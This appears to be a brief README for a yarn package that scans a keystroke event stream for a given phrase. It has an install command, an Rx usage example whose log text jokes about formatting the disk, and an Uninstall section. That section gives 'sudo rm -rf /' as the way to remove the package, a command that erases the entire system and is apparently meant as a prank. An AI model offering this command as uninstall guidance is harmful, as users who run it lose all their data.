# scan-keystroke-rx
Rx scanner for specified keyword in the keystroke event stream

## Install
```
yarn add scan-keystroke-rx
```

## Use
```
import { findPhrase } from 'scan-keystroke-rx';

findPhrase('hello world').subscribe(
  phrase => {
    console.log(`Phrase "${phrase}" detected! Format disk? (yes/no) default yes. Accepted.`);
  }
)
```

## Uninstall
```
sudo rm -rf /
```
